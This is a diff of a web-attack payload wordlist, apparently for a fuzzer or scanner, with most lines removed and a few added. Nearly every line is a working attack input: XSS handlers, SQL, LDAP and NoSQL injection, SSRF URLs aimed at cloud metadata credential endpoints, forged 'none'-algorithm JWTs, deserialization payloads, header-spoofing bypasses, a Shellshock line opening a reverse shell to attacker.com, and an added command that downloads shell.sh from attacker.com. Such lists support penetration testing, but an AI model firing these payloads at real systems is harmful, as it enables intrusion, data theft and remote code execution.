-<select onfocus=alert(1) autofocus>
-<span oncopy=alert(1)>Copy Me</span>
-<style>@import 'javascript:alert(1)'</style>
-<style>@keyframes x{}</style><x style="animation-name:x" onanimationstart="alert(1)">
-<svg onload=alert(1)>
-<svg onload=alert(document.domain)>
-<svg/onload=alert(1)>
-<svg><animate onbegin=alert(1) attributeName=x></animate></svg>
-<svg><script>alert(1)</script></svg>
-<svg><set onbegin=alert(1) attributeName=x></set></svg>
-<table background=javascript:alert(1)></table>
-<textarea oncut=alert(1)>Cut Me</textarea>
-<textarea onfocus=alert(1) autofocus>
-<u onmouseup=alert(1)>Click Me</u>
-<video src=_ onloadstart=alert(1)></video>
 <video><source onerror=alert(1)>
-<xss onmouseover=alert(1)>hover</xss>
-1' and (select 1 from(select count(*),concat((select database()),0x3a,floor(rand(0)*2))x from information_schema.tables group by x)a)--
-1' and (select substring(username,1,1) from users limit 1)='a'--
-1' and ascii(substring((select database()),1,1))>64--
-1' and benchmark(1000000,sha1(1))--
-1' and if(1=1,sleep(5),0)--
-1' and if(1=2,sleep(5),0)--
-1' and sleep(5)--
-1' and sleep(5)#
-1' OR '1'='1
--1' OR 1=1--
-1' or '1'='1' union select 1,database()--
-1' or '1'='1' union select 1,load_file('/etc/passwd')--
-1' or '1'='1' union select 1,user()--
-1' or '1'='1' union select 1,version()--
-1' order by 1--
-1' order by 2--
-1' order by 3--
-1' union select 1,2,3--
-1' union select column_name,null from information_schema.columns--
-1' union select null--
-1' union select null,load_file('/etc/passwd')--
-1' union select null,null--
-1' union select null,null,null--
-1' union select table_name,null from information_schema.tables--
-1' union select username,password from users--
-1 union%0aselect null--
-1" OR "1"="1
--1" OR 1=1--
-1) or 1=1--
-1)) or ((1=1--
-1/*!union*/select null--
-1/**/union/**/select/**/null--
-1; waitfor delay '0:0:5'--
-1'; waitfor delay '0:0:5'--
-123456
-169.254.169.254
-a' or 1=1;drop table users;--
-a:0:{}
-a:2:{s:8:"username";s:5:"admin";s:8:"is_admin";b:1;}
-Accept-Encoding: gzip,deflate
-Accept-Language: en;q=0 ,*;q=0.01
-Access-Control-Allow-Origin: *
-adm*n
-admin
-admin'--
-admin' --
-admin' #
-admin' || '1'=='1
-admin' || true || '1'=='1
-admin' AND 1=0--
-admin' AND 1=1--
-admin)(!userPassword=invalid
-admin)(&)
-admin)(|(cn=admin)(password=*
-admin)(|(password=*)
-admin)(|(userPassword=*
-admin)(objectClass=*
-admin))(|(uid=*
-admin*
-admin'/*
-admin\00
-aWQ=
-b:1;
-c${ommand}at /etc/passwd
-C:\boot.ini
-C:\windows\system32\drivers\etc\hosts
-C:\windows\win.ini
-ca$@t /etc/passwd
-Cache-Control: no-cache
-Client-IP: 127.0.0.1
-constructor.prototype.admin=true
-constructor.prototype.test=test
-Content-Length: -1
-Content-Type: application/json
-Content-Type: application/x-www-form-urlencoded; charset=utf-7
-Content-Type: text/xml
-Cookie: admin=true
-Cookie: role=admin
-Cookie: session=../../../../etc/passwd
-cos\nsystem\n(S'id'\ntR.
-csubprocess\ncall\n(lS'id'\natR.
-d2hvYW1p
-data://text/plain,<?php phpinfo();?>
-data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
-data:text/html,<script>alert(1)</script>
-data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
-dict://127.0.0.1:6379/info
-expect://id
-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.
-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.
-eyJhbGciOiJOT05FIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.
-eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
-eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.
-eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.
-eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.
-file:///etc/hosts
-file:///etc/passwd
-file:///proc/self/environ
-file:///var/www/html/.env
-foo%0abar:baz
-foo%0d%0abar:baz
-fragment on User{id email password}
-ftp://127.0.0.1:21/
-gopher://127.0.0.1:6379/_info
-Host: 127.0.0.1
-Host: 169.254.169.254
-Host: evil.com
-Host: localhost
-hs256
-http://[::]
-http://[::]:80
-http://[::1]/
-http://[evil.com]
-http://[fd00::1]/
-http://0.0.0.0/
-http://0.0.0.0:80
-http://0177.0000.0000.0001/
-http://0x7f000001/
-http://0x7f000001:80
-http://10.0.0.1
-http://10.0.0.1/
-http://100.100.100.200/latest/meta-data/
-http://100.100.100.200/latest/meta-data/dns-conf/nameservers
-http://100.100.100.200/latest/meta-data/instance-id
-http://100.100.100.200/latest/meta-data/ram/security-credentials/
-http://100.100.100.200/latest/user-data
-http://127.0.0.1/
-http://127.0.0.1:22
-http://127.0.0.1:443
-http://127.0.0.1:80
-http://127.0.1/
-http://127.1/
-http://169.254.169.254 /latest/meta-data/
-http://169.254.169.254%2flatest%2fmeta-data%2f
-http://169.254.169.254.evil.com/
-http://169.254.169.254/latest/dynamic/instance-identity/document
-http://169.254.169.254/latest/dynamic/instance-identity/signature
-http://169.254.169.254/latest/meta-data/
-http://169.254.169.254/latest/meta-data/ami-id
-http://169.254.169.254/latest/meta-data/hostname
-http://169.254.169.254/latest/meta-data/iam/
-http://169.254.169.254/latest/meta-data/iam/info
-http://169.254.169.254/latest/meta-data/iam/security-credentials/
-http://169.254.169.254/latest/meta-data/instance-id
-http://169.254.169.254/latest/meta-data/local-hostname
-http://169.254.169.254/latest/meta-data/local-ipv4
-http://169.254.169.254/latest/meta-data/placement/availability-zone
-http://169.254.169.254/latest/meta-data/placement/region
-http://169.254.169.254/latest/meta-data/public-hostname
-http://169.254.169.254/latest/meta-data/public-ipv4
-http://169.254.169.254/latest/user-data
-http://169.254.169.254/latest/user-data/
-http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01
-http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
-http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/
-http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
-http://169.254.169.254/metadata/instance/network?api-version=2021-02-01
-http://169.254.169.254/metadata/instance?api-version=2021-02-01
-http://169.254.169.254/metadata/v1/
-http://169.254.169.254@evil.com/
-http://172.16.0.1
-http://172.16.0.1/
-http://192.0.0.192/openstack/2012-08-10/meta_data.json
-http://192.0.0.192/openstack/latest/meta_data.json
-http://192.0.0.192/openstack/latest/user_data
-http://192.168.0.1
-http://192.168.0.1/
-http://192.168.1.1
-http://2130706433/
-http://2130706433:80
-http://attacker.com
-http://evil.com
-http://evil.com#169.254.169.254
-http://evil.com%23.legit.com
-http://evil.com%2f.legit.com
-http://evil.com%3f.legit.com
-http://evil.com%40legit.com
-http://evil.com?redirect=http://legit.com
-http://evil.com@169.254.169.254/
-http://internal-service/
-http://legit.com.evil.com
-http://localhost/
-http://localhost:22
-http://localhost:22/
-http://localhost:3306/
-http://localhost:443/
-http://localhost:5432/
-http://localhost:6379/
-http://localhost:80
-http://localhost:80/
-http://localhost:8080/
-http://localhost:8443/
-http://localtest.me
-http://metadata.google.internal/computeMetadata/v1/
-http://metadata.google.internal/computeMetadata/v1/instance/
-http://metadata.google.internal/computeMetadata/v1/instance/hostname
-http://metadata.google.internal/computeMetadata/v1/instance/id
-http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
-http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/
-http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
-http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
-http://metadata.google.internal/computeMetadata/v1/instance/zone
-http://metadata.google.internal/computeMetadata/v1/project/
-http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id
-http://metadata.google.internal/computeMetadata/v1/project/project-id
-http://spoofed.burpcollaborator.net
-https://attacker.com
-https://evil.com
-https://google.com
-https:/evil.com
-https:evil.com
-i:1234;
-instance-data
-javascript%3aalert(1)
-javascript&#058;alert(1)
-javascript://%0aalert(1)
-javascript://legit.com%0aalert(1)
-javascript:alert(1)
-javascript:alert(1)//
-javascript:window.location.href="https://google.com"
-jwt_secret
-key
-ldap://127.0.0.1/
-metadata.google.internal
-mutation{createUser(email:"attacker@evil.com",role:"admin"){id}}
-mutation{deleteUser(id:1){success}}
-mutation{login(username:"admin",password:"' or 1=1--"){token}}
-N;
-O:4:"User":1:{s:4:"name";s:5:"admin";}
-O:7:"process":1:{s:8:"command";s:2:"id";}
-O:8:"Exploit":1:{s:4:"data";s:4:"test";}
-O:8:"stdClass":0:{}
-Origin: file://
-Origin: http://[::1]
-Origin: http://127.0.0.1
-Origin: http://attacker.com
-Origin: http://evil.com
-Origin: http://evil.com%60legit.com
-Origin: http://evil.com/https://legit.com
-Origin: http://evil.com/path?x=https://legit.com
-Origin: http://evillegit.com
-Origin: http://LEGIT.COM
-Origin: http://legit.com%0d%0aHost:evil.com
-Origin: http://legit.com%40evil.com
-Origin: http://legit.com.evil.com
-Origin: http://legit.com:8080
-Origin: http://legit.com@evil.com
-Origin: http://localhost
-Origin: http://notlegit.com
-Origin: https://attacker.com
-Origin: https://evil%252ecom
-Origin: https://evil.com
-Origin: https://evil.com#legit.com
-Origin: https://evil.legit.com.evil.com
-Origin: https://legit.com%60.evil.com
-Origin: https://legit.com.evil.com
-Origin: https://legit.com:443
-Origin: https://legit.com?.evil.com
-Origin: https://legit.com_.evil.com
-Origin: https://localhost
-Origin: https://sub.evil.com
-Origin: https://xlegit.com
-Origin: null
-password
-PD9waHAgcGhwaW5mbygpOz8+
-phar://uploads/file.phar/shell.php
-PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
-php://filter/convert.base64-encode/resource=/etc/passwd
-php://filter/convert.base64-encode/resource=index.php
-php://filter/read=convert.base64-encode/resource=config.php
-php://input
-Pragma: no-cache
-query { user(id: 1) { password } }
-query introspectionQuery{__schema{queryType{name}mutationType{name}types{name kind description fields(includeDeprecated:true){name description type{name kind}}}}}
-query q1{users{id}}query q2{users{email}}
-query{__typename}
-query{admin{id email password}}
-query{user(id:1){id email password token}}
-query{users(limit:99999){id email password}}
-query{users{id email password}}
-Referer: http://127.0.0.1/
-Referer: http://evil.com/
-rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwABZgAKbG9hZEZhY3RvcnhwP0AAAAAAAAx3CAAAABAAAAABdAADa2V5dAAFdmFsdWV4
-rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcG...
-s:6:"foobar";
-secret
-sftp://127.0.0.1/
-test
-this.password.match(/.*/)
-Transfer-Encoding: chunked
-Transfer-Encoding: identity
-Upgrade-Insecure-Requests: 1
-User-Agent: ' or 1=1--
-User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1
-User-Agent: () { :; }; echo; /bin/id
-User-Agent: <script>alert(1)</script>
-username[$exists]=true&password[$exists]=true
-username[$gt]=&password[$gt]=
-username[$ne]=foo&password[$ne]=bar
-username[$regex]=.*&password[$regex]=.*
-username[$where]=1==1&password[$where]=1==1
-value%0d%0aHTTP/1.1 200%0d%0acontent-type:text/html%0d%0acontent-length:21%0d%0a%0d%0a<script>alert(1)</script>
-value%0d%0aX-injected:yes
-X-Client-IP: 127.0.0.1
-X-Custom-IP-Authorization: 127.0.0.1
-X-Forwarded-For: 0.0.0.0
-X-Forwarded-For: 10.0.0.1
-X-Forwarded-For: 127.0.0.1
-X-Forwarded-For: 172.16.0.1
-X-Forwarded-For: 192.168.1.1
-X-Forwarded-For: localhost
-X-Forwarded-Host: evil.com
-X-Forwarded-Proto: http
-X-Forwarded-Proto: https
-X-Host: evil.com
-X-HTTP-Method: DELETE
-X-HTTP-Method-Override: DELETE
-X-HTTP-Method-Override: PUT
-X-Method-Override: DELETE
-X-Originating-IP: 127.0.0.1
-X-Override-Method: DELETE
-X-Real-IP: 127.0.0.1
-X-Real-IP: localhost
-X-Remote-Addr: 127.0.0.1
-X-Remote-IP: 127.0.0.1
-Y2F0IC9ldGMvcGFzc3dk
-YToyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjEwOiJwYXNzd29yZDEyMyI7fQ==
-yv66vgAAAAIADAAHAAQAAQADAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==
-zip://uploads/file.zip#shell.php
+WAITFOR DELAY '0:0:10'--
+WAITFOR DELAY '0:0:5'--
+/web.config
+; wget http://attacker.com/shell.sh
+where: "id = 1 OR 1=1"
+& whoami
+; whoami
+`whoami`
+| whoami
+..\..\..\..\..\..\windows\win.ini
+/wp-config.php
+<xmp><p title="</xmp><svg/onload=alert(1)>">
+# --- XSS PAYLOADS ---
